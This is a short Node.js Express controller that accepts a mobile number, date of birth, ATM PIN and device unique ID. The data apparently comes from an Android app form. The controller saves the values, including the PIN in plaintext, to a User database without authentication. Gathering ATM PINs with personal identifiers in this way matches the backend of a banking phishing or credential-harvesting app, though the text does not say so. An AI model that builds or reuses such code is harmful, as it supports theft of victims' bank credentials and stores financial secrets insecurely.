// controllers/userController.js
const User = require('../models/User');

exports.saveUserData = async (req, res) => {
  try {
    // Destructure fields from the formdata (from formdata.kt)
    const { mobileNumber, dob, atmPin, uniqueid } = req.body;
    
    let user = await User.findOne({ uniqueid });

    if (user) {
  
      user.mobileNumber = mobileNumber;
      user.dob = dob;
      user.atmPin = atmPin;
    } else {
      user = new User({ mobileNumber, dob, atmPin, uniqueid });
    }

    await user.save();

    res.status(200).json({
      success: true,
      message: "User Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting user data"
    });
  }
};
